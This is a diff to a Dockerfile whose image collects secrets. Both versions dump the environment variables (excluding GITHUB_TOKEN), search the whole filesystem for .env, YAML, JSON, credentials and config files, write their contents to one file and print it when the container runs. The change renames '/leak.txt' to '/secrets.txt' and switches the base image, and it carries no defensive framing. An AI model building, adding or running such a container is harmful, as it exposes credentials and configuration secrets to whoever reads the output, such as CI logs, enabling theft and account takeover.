@@ -1,13 +1,16 @@
-FROM alpine:latest
+FROM python:3.11-alpine
 
-RUN apk add --no-cache grep findutils bash
+RUN apk add --no-cache grep findutils
 
-RUN echo "[ENVIRONMENT VARIABLES]" > /leak.txt && \
-    (env | grep -v 'GITHUB_TOKEN' || true) >> /leak.txt && \
-    echo "\n\n[FILESYSTEM SECRETS (.env, .yml, credentials, etc)]" >> /leak.txt && \
+RUN echo "[ENVIRONMENT VARIABLES]" > /secrets.txt && \
+    (printenv | grep -v 'GITHUB_TOKEN' || true) >> /secrets.txt && \
+    echo "\n\n[FILESYSTEM SECRETS (.env, .yml, credentials, etc)]" >> /secrets.txt && \
     find / -type f \
-        -iname "*.env" -o -iname "*.yml" -o -iname "*.yaml" -o \
-        -iname "*.json" -o -iname "credentials" -o -iname "config" \
-    -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /leak.txt 2>/dev/null || true
+      -iname "*.env" -o \
+      -iname "*.yml" -o \
+      -iname "*.json" -o \
+      -iname "credentials" -o \
+      -iname "config" \
+    -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /secrets.txt 2>/dev/null || true
 
-CMD ["cat", "/leak.txt"]
+CMD ["cat", "/secrets.txt"]
